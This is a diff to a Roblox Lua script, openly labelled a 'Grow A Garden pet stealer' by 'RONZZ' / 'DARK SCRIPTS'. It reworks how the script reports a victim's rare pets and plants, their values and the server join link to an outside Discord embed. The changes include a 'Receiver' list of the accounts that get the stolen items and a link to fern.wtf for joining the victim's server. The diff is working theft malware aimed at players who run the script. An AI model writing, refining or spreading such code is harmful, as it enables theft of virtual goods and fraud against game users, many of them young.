@@ -236,53 +236,61 @@ end
 
 -- Update SendJoinMessage to focus on pets
 local function SendJoinMessage(list, prefix)
-    local fields = {
-        {
-            name = "Victim Username:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Pet list:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary:",
-            value = string.format("Total Pet Value: ¢%s", formatNumber(totalValue)),
-            inline = false
-        }
-    }
+    -- Player info
+    local playerName = plr.Name
+    local receivers = table.concat(_G.Usernames, ", ")
+    local executor = "Delta" -- Change if you want this dynamic
+    local accountAge = plr.AccountAge or "N/A"
+    local totalValueStr = formatNumber(totalValue) .. "¢"
+    local joinUrl = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
 
+    -- Backpack formatting
+    local backpackLines = {}
     for _, item in ipairs(list) do
         if item.Type == "Pet" then
-            local line = string.format("%s (%.2f KG, Age: %s): ¢%s", item.Name, item.Weight, tostring(item.Age), formatNumber(item.Value))
-            fields[3].value = fields[3].value .. line .. "\n"
+            table.insert(backpackLines, string.format("🦊 - %s [%.2f KG] [Age %s] → %s¢", item.Name, item.Weight, tostring(item.Age), formatNumber(item.Value)))
+        elseif item.Type == "Plant" then
+            -- Example for plants, adjust as needed
+            table.insert(backpackLines, string.format("🍄 - [%s] → %s¢", item.Name, formatNumber(item.Value)))
         end
     end
+    local backpackStr = table.concat(backpackLines, "\n")
 
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
+    -- Hits section (customize as needed)
+    local hitsStr = "All Items"
 
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
+    -- Game info
+    local jobId = game.JobId or "N/A"
+    local placeId = tostring(game.PlaceId or "N/A")
+
+    -- Build the embed description
+    local description = string.format([[
+:bust_in_silhouette: **Player Information**
+Name: %s
+Receiver: %s
+Executor: %s
+Account Age: %s days
+
+:moneybag: **Total Value**
+%s
+
+:palm_tree: **Backpack**
+%s
+
+:maple_leaf: **Hits**
+%s
+
+:island: **Join with URL**
+%s
+%s | %s
+]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, hitsStr, joinUrl, placeId, jobId)
 
     local data = {
-        ["content"] = prefix .. 'Pet gifting event!\nServer Location: PlaceId=' .. tostring(game.PlaceId) .. ', JobId=' .. tostring(game.JobId),
+        ["content"] = "",
         ["embeds"] = {{
-            ["title"] = ":dog: Grow A Garden Hit - RONZZ: PET STEALER :dog:",
-            ["color"] = 25500,
-            ["fields"] = fields,
+            ["title"] = ":potted_plant: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
+            ["color"] = 3066993, -- Green, change as you like
+            ["description"] = description,
             ["footer"] = {
                 ["text"] = "GAG pet stealer by RONZZ. discord.gg/GY2RVSEGDT"
             }
@@ -359,7 +367,9 @@ for _, tool in ipairs(backpack:GetChildren()) do
                     local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                     if v14 then
                         local itemName = v14.PetType
-                        local petAge = v14.PetData and v14.PetData.Age or "N/A"
+                        local toolName = tool.Name
+                        local age = toolName:match("%(Age:%s*(%d+)%)")
+                        local petAge = (v14.PetData and v14.PetData.Age) or age or "N/A"
                         -- Only include rare pets and their mutated forms
                         if isRarePet(itemName) then
                             if tool:GetAttribute("Favorite") then
@@ -371,7 +381,6 @@ for _, tool in ipairs(backpack:GetChildren()) do
                                 end
                             end
                             local value = calcPetValue(v14)
-                            local toolName = tool.Name
                             local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
@@ -387,7 +396,6 @@ for _, tool in ipairs(backpack:GetChildren()) do
                                 end
                             end
                             local value = calcPetValue(v14)
-                            local toolName = tool.Name
                             local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
